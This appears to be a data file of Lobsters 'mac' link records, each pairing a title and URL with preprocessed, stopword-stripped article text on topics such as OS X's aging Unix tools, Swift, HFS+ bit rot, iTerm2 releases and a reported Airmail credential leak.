708,Lobsters,mac,Apple macOS,Behind OS X’s modern face lies an aging collection of Unix tools,http://robservatory.com/behind-os-xs-modern-face-lies-an-aging-collection-of-unix-tools/,behind o x modern face lie aging collection unix tool,covered recently bash security hole update released macports patched version bash apache artistic bsd gpl gpl isc mitx php public domain released o x bash huge number change improvement described yesterday git git rsync rsync released emacs emacs nine release sqlite sqlite official release ssh openssh sudo sudo gnu gpl gnu general public license version patente language microsoftnovell deal macports fink homebrew wrapping see well worked gm,note article heavily modified total knucklehead completely forgot gpl geordie korper pointing comment basically cause aging unix tool o x gpl updated following table include license information every case one nano gpl license nonupdated apps leave though case anyone curious stuff covered recently version bash ship o x quite old vulnerable recentlyrevealed bash security hole point apple release o x update containing patched version bash update released apple patched bash version shell simply ancient old bash roughly seven year behind current version seven year like well forever internet time bash age gap mind took look number common unix maverick see version use checked apps macports tool make simple install many unix apps macports nt necessarily absolute latest version every unix app stay relatively current instance already patched version bash fix vulnerability result interesting say core unix utility o x year multiple version behind open source er source thank gpl noted covered detail still leaf big question matter care tool nt keeping latest presumably greatest version problem merely statement work well enough majority user nt want bother reading general opinion nt matter maverick yosemite macports tool curr license version date version date version date bash gpl curl mitx apr jul sep emacs gpl git gpl may jul aug grep gpl oct oct jun man unknown nano gpl aug aug nov openssl apache jun jun aug perl artistic php php jul aug aug rsync gpl public domain jul aug aug ssh bsd dec dec aug sudo isc feb feb sep tcsh bsd jul jul feb vivim bsd aug aug aug zsh mit dec jan aug link license definition apache artistic bsd gpl gpl isc mitx php public domain highlighted entry reflect tool getting update yosemite see version applesupplied tool far behind macports version might even older current version question sure apple might willing able answer version really old appear fix andor feature backported older version number know least one case fix backported openssl real release one created apple released o x contains fix number cf openssl clearly get backported security update apps looking version number suspect bash may also backported version number identical structure official release macports leaf huge number tool simply old apparently lacking security feature update old really old many case mean key tool rely bash noted earlier o x us old version year older current release four year older release bash release big one huge number change improvement one example consider help output bash command cd history etc help dirs display o x version bash help dirsdirs dirs clpv n n display list currently remembered directory directory find way onto list pushd command get back list popd command l flag specifies dirs print shorthand version directory relative home directory mean bin might displayed homesbfoxbin v flag cause dirs print directory stack one entry per line prepending directory name position stack p flag thing stack position prepended c flag clear directory stack deleting element n display nth entry counting left list shown dirs invoked without option starting zero n display nth entry counting right list shown dirs invoked without option starting zero display macports version bash help dirsdirs dirs clpv n n display directory stack display list currently remembered directory directory find way onto list pushd command get back list popd command option c clear directory stack deleting element l print tildeprefixed version directory relative home directory p print directory stack one entry per line v print directory stack one entry per line prefixed position stack argument n display nth entry counting left list shown dirs invoked without option starting zero n display nth entry counting right list shown dirs invoked without option starting zero exit status return success unless invalid option supplied error occurs functional difference two dirs command term option command help much easier read newer version bash may use help much nice wellformatted page read problem updating bash tied lowest level o x macports make easy install run newer version bash script systemprovided script process still call old bash actually replaced version bash described yesterday potentially dangerous far though thing working normally would expect apple patch security hole bash giving u version install git familiar git version control system nt use know quite people bring date taking step backwards yosemite today least version git latest developer preview actually older version maverick note apple apparently ship customized version git based apple designation version number assume temporary issue see updated version yosemite ship rsync use rsync incredibly useful command line tool syncing file across hard drive tofrom remote system rely multidrive multisite backup system version current o x version released eight year ago next version released apple six year behind major version upgrade update come since macports current version lot new feature rsync release many make tool run faster preserve file data predecessor nt o x kept release perhaps disk utility us rsync manner languishing personally switched macports installation issue emacs personally bbedit vi guy know lot folk love rely emacs o x version seven nine current ton new feature bug fix release including better unicode support along security patch o x emacs security fix idea sure tell best tell emacs standalone tool integrated core o x feature nt apple given u newer version seven year sqlite apple us sqlite number database task tracking mail message given well tied system perhaps surprising fallen behind official release surprising far behind full release since last updated perhaps broke rely nt fix good news getting update nearlycurrent status yosemite ssh one surprise important security remote connectivity service provided openssh figured apple would keep one current unless hiding backported fix old version number stock version ssh roughly three year old missing four fairly major update really relying outofdate version ssh lacking key security update emailed apple security asking share anything update ssh really expecting response sudo sudo look quite date quite bad appears branch maintenance branch receives new feature bug fix within maintenance branch one newer release release contains one security bug fix though nt appear serious hole search new sudo feature large number people use macports install version current tree get new feature gnu gpl thanks geordie korper commenting obvious completely overlooked original posting likely cause aging code base gnu general public license version new version june governs many open source apps noted beginning article clearly gpl preventing many tool updated exactly license scare apple away sure web searching seems indicate might related patente language direct result microsoftnovell deal know reason apple feel ca nt legally include gpl apps o x shame apps good thankfully install newer version nothing click bit typing install newer version tool many apps via o x package manager many choose personally use macports also fink homebrew pick one work best nt live apple ancient tool package manager make easy get new version also keep separate o x version cause issue road wrapping back big question matter generalizing opinion nt really matter o x user never venture near command line age bundled tool wo nt make difference long gui side o want happy taking generalist hat curious apple handle security fix older version tool backporting current release keeping version number dangerous path follow see well worked gm still backporting mean least security fix patching release good news maybe day see version gpl apple live doubt exactly poster child free software foundation mission
709,Lobsters,mac,Apple macOS,.gitignore for Dropbox,http://konolige.com/dbignore/,gitignore dropbox,installation usage gitignore doc setting supported platform,installation download latest zip release tab run install resulting folder usage add dbignore directory tell dropbox ignore certain file file ignored match pattern dbignore file see gitignore doc information setting setting dbignore located dropboxdbignoreconfig json format currently supported setting changing name ignore file want use gitignore instead dbignore add ignorefilename gitignore dropboxdbignoreconfig supported platform currently supported platform osx dbignore tested work earlier version
710,Lobsters,mac,Apple macOS,Alamofire: Elegant Networking in Swift,https://github.com/Alamofire/Alamofire,alamofire elegant networking swift,feature component library alamofire software foundation alamofireimage alamofirenetworkactivityindicator requirement migration guide communication installation cocoapods cocoapods carthage carthage swift package manager swift package manager manually embedded framework submodule open radar resolved radar workarounds faq origin name alamofire alamo fire flower credit alamofire software foundation alamofiresf security disclosure security alamofireorg donation asf license see license,alamofire http networking library written swift feature component library order keep alamofire focused specifically core networking implementation additional component library created alamofire software foundation bring additional functionality alamofire ecosystem alamofireimage image library including image response serializers uiimage uiimageview extension custom image filter autopurging inmemory cache prioritybased image downloading system alamofirenetworkactivityindicator control visibility network activity indicator io using alamofire contains configurable delay timer help mitigate flicker support urlsession instance managed alamofire requirement io macos tvos watchos xcode swift migration guide communication installation cocoapods cocoapods dependency manager cocoa project usage installation instruction visit website integrate alamofire xcode project using cocoapods specify podfile pod alamofire carthage carthage decentralized dependency manager build dependency provides binary framework integrate alamofire xcode project using carthage specify cartfile github alamofirealamofire swift package manager swift package manager tool automating distribution swift code integrated swift compiler early development alamofire support use supported platform swift package set adding alamofire dependency easy adding dependency value packageswift dependency package url http githubcomalamofirealamofiregit uptonextmajor manually prefer use aforementioned dependency manager integrate alamofire project manually embedded framework open terminal cd toplevel project directory run following command project initialized git repository add alamofire git submodule running following command git submodule add http githubcomalamofirealamofiregit open new alamofire folder drag alamofirexcodeproj project navigator application xcode project appear nested underneath application blue project icon whether xcode group matter select alamofirexcodeproj project navigator verify deployment target match application target next select application project project navigator blue project icon navigate target configuration window select application target target heading sidebar tab bar top window open general panel click button embedded binary section see two different alamofirexcodeproj folder two different version alamofireframework nested inside product folder matter product folder choose matter whether choose top bottom alamofireframework select top alamofireframework io bottom one macos verify one selected inspecting build log project build target alamofire listed alamofire io alamofire macos alamofire tvos alamofire watchos alamofireframework automagically added target dependency linked framework embedded framework copy file build phase need build simulator device open radar following radar effect current implementation alamofire rdar compiler throwing warning due tollfree bridging issue test case rdar background url session configuration work simulator rdar urlprotocol apis properly handle urlrequest urlsession task didfinishcollecting never called watchos resolved radar following radar resolved time filed alamofire project rdar swift string interpolation causing memory leak common usage resolved xcode beta rdar urlsessiontaskmetrics failing link watchos resolved add cfnetwork linked framework workarounds collection urlsessiontaskmetrics currently disabled watchos due faq origin name alamofire alamofire named alamo fire flower hybrid variant bluebonnet official state flower texas credit alamofire owned maintained alamofire software foundation follow twitter alamofiresf project update release security disclosure believe identified security vulnerability alamofire report soon possible via email security alamofireorg please post public issue tracker donation asf looking raise money officially stay registered federal nonprofit organization registering allow foundation member gain legal protection also allow u put donation use taxfree donating asf enable u pay yearly legal fee keep nonprofit good status pay mail server help u stay top question security issue potentially fund test server make easier u test edge case potentially fund developer work one project fulltime community adoption asf library amazing greatly humbled enthusiasm around project want continue everything move needle forward continued support asf able improve reach also provide better legal safety core member use library work see employer would interested donating amount donate today help u reach goal would greatly appreciated license alamofire released mit license see license detail
711,Lobsters,mac,Apple macOS,-2000 Lines Of Code,http://www.folklore.org/StoryView.py?project=Macintosh&story=Negative_2000_Lines_Of_Code.txt&sub=HN0,line code,,early lisa software team trying buckle big push ship software within next six month manager decided would good idea track progress individual engineer term amount code wrote week week devised form engineer required submit every friday included field number line code written week bill atkinson author quickdraw main user interface designer far important lisa implementor thought line code silly measure software productivity thought goal write small fast program possible line code metric encouraged writing sloppy bloated broken code recently working optimizing quickdraw region calculation machinery completely rewritten region engine using simpler general algorithm tweaking made region operation almost six time faster byproduct rewrite also saved around line code putting finishing touch optimization time fill management form first time got line code part thought second wrote number sure manager reacted know couple week stopped asking bill fill form gladly complied
712,Lobsters,mac,Apple macOS,"Tower 2: Version control with Git - made easy. In a beautiful, efficient, and powerful app.",http://www.git-tower.com/,tower version control git made easy beautiful efficient powerful app,,esteban torresengineer soundcloud new tower add lot great feature help go day faster like ability create pullrequests directly tool dan counsellceo realmac tower perfect git client honestly want use anything else daniel schutzsmithamnesty international use tower changed game made git much visual understand
713,Lobsters,mac,Apple macOS,Swift Sequences and Lazy Evaluation,http://www.scottlogic.com/blog/2014/06/26/swift-sequences.html,swift sequence lazy evaluation,swift sequence deferred execution lazy evaluation deferred execution lazy evaluation fibonacci sequence fibonacci sequence manipulating sequence creating sequence operation exswift conclusion,lot fun poking around swift apis past week lack documentation mean real gem hidden among mundane api language feature blog post want take quick look swift sequence protocol form basis forin loop see allows write code performs sequence operation evaluated ondemand swift sequence swift couple elegant language feature forin loop range used combination provide succinct syntax simple loop println code iterates integer range funky range operator simple shorthand creating range instance result following code entirely equivalent var range range start end range println range allows forin loop iterate number generates forin loop operates object adopt sequence protocol represents ordered source data sequence protocol expose single method generate return generator expose single method next allows forin loop pull stream item sequence probably make lot sense continuing expand current example make explicit use sequence generator var sequence range start end var generator sequencegenerate let generatornext println one interesting point swift range finite sequence start end sequence protocol mandate used represent infinite sequence although probable avoid using infinite sequence forin loop deferred execution lazy evaluation seen swift sequence let look support concept lazy evaluation first couple definition deferred execution deferred execution mean evaluation expression calculation deferred resultant value required sequence opportunity defer execution value requested generator lazy evaluation lazy evaluation topic relates deferred execution context swift sequence lazy evaluation implemented ensuring work required provide next value via generator performed next value actually requested probably sound like quite abstract concept let see used practice fibonacci sequence let say want perform calculation fibonacci sequence could populate array first term use calculation swift sequence offer elegant alternative simple implementation using swift sequence class fibonacci sequence typealias generatortype fibonaccigenerator func generate fibonaccigenerator return fibonaccigenerator class fibonaccigenerator generator var current nextvalue typealias element int func next int let ret current current nextvalue nextvalue nextvalue ret return ret fibonacci class implement sequence protocol note sequence generic protocol hence need typealias specify type parameter fibonaccigenerator generator implementation real work happens time next method invoked next number neverending sequence generated see result simply iterate first number sequence let fib fibonacci generate println fibnext yield following output actually slightly simpler way implement sequence remove need separate generator type following make use generatorof pas function closure implement required functionality class fibonacci sequence func generate generatorof int var current next return generatorof int var ret current current next next next ret return ret pretty neat order aid understanding next set example following add simple println statement fibonacci sequence see next item requested generator class fibonacci sequence let id string init id string selfid id func generate generatorof int var current next return generatorof int var ret current current next next next ret println selfid ret return ret updating code iterates sequence use implementation log generation let fib fibonacci fib generate println fibnext yield following output fib fib fib fib clearly demonstrates next item requested generator iteration fibonacci sequence generated lazily manipulating sequence lazy evaluation sequence quite cool thing get even interesting apply operation sequence transforming output swift apis handful operation apply sequence let say interested even number within fibonacci sequence achieved using filter function let fibonacci fibonacci fib let evennumbers filter fibonacci filter method return new sequence contains item within source sequence closure return true result evennumbers also sequence result deferred execution perform operation sequence nothing generated something start pulling data one sequence see action iterate first item sequence var generator evennumbersgenerate println generatornext yield following output fib fib fib fib fib fib fib fib fib fib see source sequence generating multiple value value pass filter operation lazily evaluated another interesting operation applied using struct combine pair sequence generating tuples combine generated output sequence example following zip together odd even fibonacci number let evennumbers filter fibonacci let oddnumbers filter fibonacci var zipped oddnumbers evennumbers generate println zippednext give following output creating sequence operation unfortunately filter pretty much sequence operation could find within swift apis go adding operation personally keen global function prefer add functionality via class extension unfortunately sequence protocol extended however lost framework provides sequenceof struct wrap adapts sequence without changing behaviour context used type providing extension creating sequence operation mindful fact evaluate lazily like fibonacci sequence example simple skip operation skip first n item sequence extension sequenceof func skip n int sequenceof var generator selfgenerate n println skipped generatornext return sequenceof generator adding skip zip let evennumbers filter fibonacci let oddnumbers filter fibonacci var zipped sequenceof oddnumbers evennumbers skip generate println zippednext yield following output skipped skipped course chain multiple operation skip skip however simple skip operation much fun think sequence show lot potential plan contribute suite operation already rather excellent exswift library conclusion swift sequence really cool show lot potential example blog post little contrived unlikely find performing operation fibonacci sequence however could certainly see operating sequence generated stream perhaps paging network request regard colin e
714,Lobsters,mac,Apple macOS,I Don't Know Swift,http://robnapier.net/i-dont-know-swift,nt know swift,provocative radar tiobe evaluation swift start end well let developer build really fantastic io mac apps something,know thing two objectivec bragging reading blog decent chance know objectivec opinion take seriously even disagree founded shipping lot code shipped cocoa software solo big team o x io yearlong release cycle hour build demo steve job writing objc since new hotness arc property intel many developer much experience even know thing two objectivec idea write swift neither anyone else even apple nobody know swift baked yet early day still figuring established pattern syntax still changing stdlib still changing know even big change horizon writing compiler shipping app thing take realworld experience one tim burk wrote provocative radar recently like suggest appropriate way introduce new language creator spend several month writing nontrivial application language reviewing result expert seem done often done people language design experience work new language mostly secret obscurity release people maybe internally small community start form insider first adopter try thing tinker build bigger thing least build large library go stdlib part net c revise languge based learn people come maybe becomes public maybe gain critical mass new uninitiated people start use serious thing maybe even becomes important swift come naked world halfbaked part illconsidered changing dramatically eye library still objc c c beginning early adopter usually tiny almost handpicked group thousand time primordial era think good bad definitely special opportunity predict great confidence swift tiobe language year entered list even released yet ground floor standing newly poured foundation seems pretty solid building quite yet imagine google said go future android development microsoft recommended c developer move f apple made swift preferred language one popular platform existance expect follow evaluation swift start end well let developer build really fantastic io mac apps believe swift meet criterion even better objc love objc see reason apple would back away swift go beginning priesthood old folk sitting rocking chair cussing newfangled dotsyntax old folk remember immutable array dayzero swift expert could yearzero swift expert even wait io ship niche still open read everything write something get involved try new pattern see work tell people discover thing swift bother work could better say open radar post devforum write example show way make code better swift still changing beta exactly change may long time chance
715,Lobsters,mac,Apple macOS,iTerm2 2.0 Released,http://www.iterm2.com/news.html,released,security update released please upgrade version released change log downloads page gpu renderer released change log downloads page important security update official statement version released change log version stable released read full announcement downloads page released change log downloads page,security update released please upgrade sunnyvale serious bug fixed version user older version upgrade right away detail found http groupsgooglecomforum version released sunnyvale version released featuring two new theme status bar powerful python scripting api many core feature improved title displayed keyboard input transmitted background image drawn detail please see change log get downloads page stable release section gpu renderer released sunnyvale version released featuring new drawing engine us metal improve rendering performance using gpu screen update much faster leaving cpu free scrolling buttery smooth many new feature bug fix also included read change log detail get downloads page stable release section important security update version released contains important security update prior version could leak private data dns request please update later information please see official statement version released sunnyvale version stable release add many notable feature touch bar support ligature font support many improvement hotkey window copy mode score small new feature like hyperlink new shell integration utility bug fix see detail change log version stable released sunnyvale eighteen month development four month beta period third major version released read full announcement get downloads page stable release section released sunnyvale three year development second major version released add dozen new feature countless bug fix smell april fresh new feature find deep tmux integration speak directly tmux display virtual window native window tab making tmux much easier navigate toolbelt added toolbelt drawer open right window show running job paste history field taking note facilitates opening new session support trigger trigger defines action performed text matching regular expression received example highlight error red bounce dock icon build finish respond prompt automatically literally dozen new preference let customize every aspect terminal new proprietary escape sequence integrate terminal apps allowing change session profile automatically manipulate pasteboard remotely bounce dock icon much full list change please see change log downloads available downloads page
716,Lobsters,mac,Apple macOS,Ubuntu With Linux 3.16 Smashes OS X 10.9.4 On The MacBook Air,http://www.phoronix.com/vr.php?view=20687,ubuntu linux smash o x macbook air,linux phoronix test suite,month since last running linux v mac o x performance benchmark today benchmark latest o x release haswellbased apple macbook air compared running ubuntu lts hardware also upgrading linux development kernel macbook air used testing intel core processor dualcore plus hyper threading base frequency turbo intel hd graphic haswellult system memory apple ssd o x run default state using preferred xcode development stack provides llvm svn ubuntu lts dualbooted apple macbook air ubuntu lts run xfce desktop environment also enabled oibaf ppa obtaining mesa latest intel linux graphic driver code hd graphic ubuntu lts run stock kernel upgraded linux development kernel stack hardware change made testing cpu frequency reporting difference information come hardware detectionreporting change different kernel o x linux benchmarking done via opensource phoronix test suite
717,Lobsters,mac,Apple macOS,Hack your OS X desktop environment,https://github.com/sdegutis/hydra,hack o x desktop environment,mjolnir mjolnir try latest release homebrew homebrew http luarocksorgsearch qmjolnir uninstalling installing home finding module http luarocksorgsearch qmjolnir documentation dash publishing module principle faq add space support luarocks way upgrade module automatically getting error like attempt index field win nil value nt thing usrlocal ca nt load module mjolnir v apps hydra phoenix zephyros slate spectacle moom sizeup divvy hammerspoon hammerspoon community mailing list credit thanks various contributor change note license,mjolnir lightweight automation productivity powertool o x current version mjolnir requires o x higher mjolnir mjolnir o x app let automate common task using language lua core nt actually anything besides load lua environment real power lie useful module install write config mean mjolnirinitlua file along whatever module requires full access builtin mjolnir module lua module installed eg luarocks way want install try download latest release unzip rightclick mjolnirapp choose open install homebrew brew cask install mjolnir install lua usrlocal eg homebrew install luarocks brew update brew install lua brew install luarocks install module list http luarocksorgsearch qmjolnir luarocks install mjolnirhotkey luarocks install mjolnirapplication note nt need install every module since lowerlevel one dependency eg installing mjolnirhotkey automatically installs mjolnirkeycodes etc create mjolnirinitlua top require module installed eg like local application require mjolnirapplication local hotkey require mjolnirhotkey local window require mjolnirwindow local fnutils require mjolnirfnutils note mjolnirwindow module come mjolnirapplication nt need ca nt install separately also mjolnirfnutils already installed dependency module nt need explicitly install start writing fun stuff hotkeybind cmd alt ctrl function local win windowfocusedwindow local f win frame fx fx win setframe f end reload config using mjolnirreload console uninstalling reason want undo everything step luarocks purge treeusrlocal brew uninstall lua luarocks rm luarocksconfiglua installing home run luarocks local install instead luarocks install install luarocks instead usrlocal update packagepath packagecpath accordingly noted faq finding module check http luarocksorgsearch qmjolnir list published mjolnir module notable module mjolnirhotkey creating global hotkeys mjolnirapplication inspecting manipulating running o x application window mjolniralert showing onscreen message documentation mjolnir mjolnirmodules use dash documentation install mjolnir docset user contributed section downloads tab dash preference window generally update publishing module wrote awesome module want share world check sampleplugin subdirectory published please announce mailing list avoid temptation reformat repos page wiki us strict format needed documentation generator principle development mjolnirapp core mjolnir module follow principle must stable app never crash ever launch stay running quit period must lightweight never anything drain computer battery never poll anything use little ram possible everything feel instant snappy never sluggish delayed completely transparent surprise behaving executed everything fully predictable must bloated app core module must always adhere minimalist philosophy excuse everything else separate lua module faq add space support question anyway public private apis manage space o x private apis work open source project able crack problem yet u luarocks way upgrade module automatically sadly done manually removing module reinstalling hoping maybe one day enthusiastic mjolnir user jump improve tooling around getting error like attempt index field win nil value disable reenable accessibility may look enabled anyway o x bug mjolnir bug nt thing usrlocal ca nt load module add path packagepath packagecpath initfile example using boxen add packagepath packagepath lua packagecpath packagecpath mjolnir v apps hydra phoenix zephyros old apps mjolnir spiritual successor slate programmercentric somewhat similar goal different approach mjolnir modularized slate allinone try see one suit better spectacle moom sizeup divvy mjolnir intended programmer want write program customize environment intended dragndrop solution meant allow write personalized productivity enhancement suite keep use longterm hammerspoon hammerspoon fork mjolnir get fork andor spoon mjolnir aka thor hammer created turn mjolnir back allinone application prefer completely decentralized module system barebones core kind like debate monolithic kernel v microkernel actively maintained like literally commit activit every week community mailing list fine place share idea follow release announcement also shrinking irc channel freenode mjolnir credit thanks mjolnir developed steven degutis help various contributor special thanks special order habbie constant help support ever since moment first jumped lua said anyone wan na try o x window manager scriptable lua first person join irc channel helping nearly every lua question cmsj keithbsmiley briangilbert muescha chdiza asmagill splintax arxanas help support writing one two three app icon project jhgg contributing many awesome module project kapeli patience constant dash question pr everyone else helped probably forgotten thanks help everyone donated thank much support see inapp panel open source license software mjolnir us internally basically lua license change note upgrading system preference pretend like mjolnir accessibility enabled showing checked checkbox fact still need disable reenable bug o x removed donation request default implementation mjolnirshowerror err open console focus mjolnir new variable mjolnirconfigdir mjolnir user module coordinate new mjolnirfocus function make mjolnir focused app original print function stored mjolnirrawprint rather mjolnirprint disambiguate new mjolniropenconsole function open console bring mjolnir front renamed global mj mjolnir ui changed drastically expect nothing place look pretend brand new app module handled luarocks instead app core namespace renamed mj mjwindow module ship mjapplication luarocks package since depend mjscreen framewithoutdockormenu called mjscreen frame mjscreen frameincludingdockandmenu called mjscreen fullframe license released mit license copyright c steven degutis permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software
720,Lobsters,mac,Apple macOS,HFS+ Bit Rot,http://blog.barthe.ph/2014/06/10/hfs-plus-bit-rot/,hf bit rot,swift hf seriously old hf infamous quote hf unicode encoding hf serious limitation flaw hard link journaling extended attribute hot file defragmentation full disk encryption fusion drive snapshotting versioning timemachine bit rot zfs concrete example bit rot previous blog post snapraid arq amazon glacier eos hf lost total file course year keeping file backup hf volume wrong check file corruption addendum june jim salter john siracusa,hf terribly old filesystem serious flaw sincerely hope apple come update filesystem wwdc working swift past year learned last week hf seriously old hf released era mac o classic predates current unix based version o x least three year created period business dire situation michael uttered infamous quote would shut give money back technically hf small evolution predecessor hf date back toâ major change hf hf transition block address bit bit change really needed hard drive capacity exploded late bit addressing scheme file containing single byte would use hard drive around hard drive change included transition longer filename character switch unicode encoding large rest design hf remained unchanged sinceâ hf serious limitation flaw first released hf support hard link journaling extended attribute hot file online defragmentation feature gradually added subsequent release mac o x basically hacked death lead complicated slow reliable implementation early day system hard limit number file could written deleted lifetime volume ieâ volume would stop able add file directory hf every entry filesystem associated cnid catalog number id early implementation used simple global counter nextcatalogid stored volume header could incremented one maximum value reached recent version mac o x recycle old unused cnids give idea type consideration went design hf recently apple added support full disk encryption filevault fusion drive feature implemented layer underneath file system core storage logical volume manager additional feature like snapshotting versioning would probably require much tighter integration file would also make timemachine extremely efficient reliable currently timemachine built top file system relies capturing io event add overhead complexity another hack finally bit rot time data stored spinning hard disk ssds degrade become incorrect modern file system like zfs apple considered abandoned replacement include checksum meta data structure content mean file accessed filesystem detects corruption throw error prevents incorrect data propagating backup zfs also scrub disk regular basis verify existing file corrupted preemptively concrete example bit rot large collection photo start around file kept hf volume since existence addition timemachine backup also use two backup solution described previous blog post keep copy photo linux microserver using checksum verify regularly using snapraid also keep offsite backup using arq amazon glacier acquired linux microserver used keep copy photo dreamhost account recently compared photo current version imac bit shocked result photo taken file represent total gib photo raw file old eos camera photo regular jpegs come camera friend relative hf lost total file course year corrupted file completely unreadable jpegs typically decode partially point failure lucky may get image except bottom part raw file usually turn totally unreadable either completely black large color overlay significant portion photo shot important handful one file particular good picture son baby printed framed photo glad lose original keeping file backup hf volume wrong check file corruption used following technique compare photo dreamhost backup main hf volume ran shasum commmand line tool compute hash every single file backup folder except dsstore file ran shasum verify mode check file main volume hash difference either indicate voluntary modification apply case corruption courtesy hf case compute checksum find type f name dsstore exec shasum shasumstxt check checksum shasum c shasumstxt checktxt filter difference cat checktxt fgrep v ok use technique check corruption single volume need compute checksum verify time time use clone backup probably good idea check corruption clone addendum june thanks everyone spent time send feedback thing would like add â erratum zfs us checksum everything metadata understand corruption caused hardware issue complain lack checksum hf make silent error corrupted file accessed issue specific hf filesystems include checksum either people written article similar topic jim salter john siracusa ar technica particular
721,Lobsters,mac,Apple macOS,Unit Testing in Swift,http://bendyworks.com/unit-testing-in-swift/,unit testing swift,unit testing swift simple test using common subject xctestâ handle multiple test one testcase conclusion,unit testing swift swift rage last four day definitely livened programming chat room quite bit cautious optimism betsy brad delved xcode beta curious state testing swift purpose article cover basic unit testing xctestframework simple test get thing rolling wrote plain old swift object represent firewood class firewood var charred bool init println initializing firewood charred false func burn charred true see simple initializer andâ oneâ function burn firewood write simple test assert burning firewood char import xctest class simplefirewoodtests xctestcase func testburningactuallychars let firewood firewood firewoodburn assert firewoodcharred charred burning using common subject multiple test using setup object test use rspec parlance want repeat initialization inside test dry trial error involving opaque runtime error learned answer definitely involve overriding init method xctestcase subclass go hic sunt dracones instead want declare initialize instance variable let var shown class simpledryfirewoodtests xctestcase let firewood firewood func testburningactuallychars firewoodburn assert firewoodcharred charred burning may seem little counterintuitive might ask happens firewood object subsequent test block mutate one take u next section xctestâ handle multiple test one testcase xctest avoids using dirty object previous test instantiating brandnew xctestcase object test function threeâ test xctestcase subclass framework instantiate threeâ object whole xctestcase subclass work test suite even start observe class firewoodtests xctestcase let firewood firewood func println testing new object test assert firewoodcharred charred burning firewoodburn func println testing new object test assert firewoodcharred charred burning firewoodburn func testburningactuallychars firewoodburn assert firewoodcharred charred burning since subject print time init called see happens relation everything else test run beginning log output initializing firewood initializing firewood initializing firewood test suite test started note three firewood object created presumably three different firewoodtests object test suite even begin output conclusion hope article help avoid misstep took seems unit testing swift implemented well despite dearth documentation anyone else adventure share testing swift
722,Lobsters,mac,Apple macOS,Netflix HTML5 Video in Safari on OS X Yosemite,http://techblog.netflix.com/2014/06/html5-video-in-safari-on-os-x-yosemite.html,netflix video safari o x yosemite,video safari o x yosemite premium video extension mac developer program o x beta program netflixcom medium source extension hour longer battery life macbook air streaming netflix encrypted medium extension web cryptography api ie window see also,video safari o x yosemiteby anthony park mark watsonwe excited announce netflix streaming video available safari o x yosemite working closely apple implement premium video extension safari allow playback premium video content browser without use plugins apple mac developer program soon o x beta program install beta version o x yosemite o x yosemite beta modern mac visit netflixcom today safari watch favorite movie tv show using video without need install pluginswe especially excited apple implemented medium source extension mse using highly optimized video pipeline o x let watch netflix buttery smooth without hogging cpu draining battery fact allows get hour longer battery life macbook air streaming netflix enough time one movie apple also implemented encrypted medium extension eme provides content protection needed premium video service like netflixfinally apple implemented web cryptography api webcrypto safari allows u encrypt decrypt communication javascript application netflix serversthe premium video extension away need proprietary plugin technology streaming video addition safari o x yosemite pluginfree playback also available ie window look forward time apis available browserscongratulations apple team advancing premium video web yosemite looking forward yosemite launch fallsee also
723,Lobsters,mac,Apple macOS,Airmail: Major Security Vulnerability?,http://istrategylabs.com/2014/05/airmail-major-security-vulnerability/,airmail major security vulnerability,security engineering maninthemiddle attack ssl observation dsploit http everywhere info islco,post written airmail first version finding way reflect current state application internet security cryptography always huge interest mine topic becoming increasingly important people understand knowledge subject recently reading absolutely brilliant security engineering ross anderson particularly captivated two particular attack maninthemiddle attack even devastating phishing attack week ago andrew fellow engineer approached androidbased penetration suite decided use take quick inventory security personal internet property personally experience elementary penetration testing mostly using metasploit framework never thought would able perform advanced maninthemiddleattack provoked interest thoroughly surprise horror able perform attack tap button shortly initiating attack discovered two email credential appearing plain device performing number test expand momentarily noticed trend seemed like mac application airmail sending credential unencrypted network despite u ssl enabled within client go detail tested theory one could reproduce might appropriate explain basic concept maninthemiddle attack maninthemiddle attack device phone computer router spoof personal device thinking true party attempting communicate one example alice attempting communicate information bob vulnerability reporting alice email server bob maninthemiddle attack however third party example mallory intercept alice bob internet traffic trick thinking talking directly one another reality traffic going mallory able view unencrypted data ssl key point maninthemiddle attack theoretically unencrypted information risk cryptographer developed number extremely effective method encryption prevent problem popular widely used ssl visit website see green lock button assuming using chrome indicates traffic encrypted using ssl protocol without going many detail ssl enabled email client communicate server using encrypted channel even someone intercept traffic would decrypt information operation requires massive amount time computational power access either user secret key able read content data sent two original party ssl additionally us third party independently verify integrity communicating party essence ssl main defense one use prevent potential maninthemiddle attack obtaining sensitive information observation problem andrew identified airmail sending credential without encryption despite fact selected ssl option application setting email provider used supported ssl still sure legitimate vulnerability factor play addition notified developer airmail working investigate issue said wanted walk step used reproduce problem hope knowledgeable member tech community able verify reject conclusion test vulnerability first created new gmail yahoo mail account would use test different mail client provider loaded account onto apple mail client airmail accessed provider web client initiated maninthemiddleattack using dsploit traffic network sent email using apple mail web client unable point see two account credential sent email using airmail ssl enabled proceeded intercept account credential satisfied test alone replicated prior step additional network time time able see credential account using airmail credential account using email client issue come conclusion u either proven wrong update made software discontinued use airmail addition encouraged colleague take following step protect potential attack mainly using single password numerous online service big mistake encourage everyone use password manager generate completely random password site use prevent attack described post essential habit practice additionally recommend using software http everywhere force website use ssl encryption available move forward investigating issue keep everyone date stated hope knowledgable party reproduce test help u move towards conclusion please feel free reach info islco question information subject leave comment
725,Lobsters,mac,Apple macOS,Pop: an extensible animation engine for iOS and OS X by Facebook,https://github.com/facebook/pop,pop extensible animation engine io o x facebook,paper installation cocoapods framework manual note note static library manual usage objectivec swift start stop update objectivec swift objectivec swift objectivec swift type objectivec swift objectivec swift objectivec swift property objectivec swift objectivec swift debugging objectivec swift objectivec swift testing scenekit weakly linked framework xcode release note resource contributing license,pop extensible animation engine io tvos o x addition basic static animation support spring decay dynamic animation making useful building realistic physicsbased interaction api allows quick integration existing objectivec swift codebases enables animation property object mature welltested framework drive animation transition paper installation pop available cocoapods add following project podfile bug first fixed master made available via designated release tend live bleeding edge use pop master following podfile entry pod pop git http githubcomfacebookpopgit framework manual adding project project adding popembedded framework embedded binary section general tab app target set pop second also enables import pop syntax header module note awkward limitation xcode embedded binary must share name module must framework extension mean see three popframeworks adding embedded binary one o x one tvos one io need sure add right one appear identically list note list populated order target verify correct one chosen checking path next framework listed format configuration platform eg debugiphoneos note method currently play nicely workspace since target depend embed product target project work popxcodeproj added subproject current target project otherwise need manually set build ordering scheme copy product static library manual alternatively add project workspace adopt provided configuration file manually copy file pop subdirectory project installing manually ensure c standard library also linked including lc project 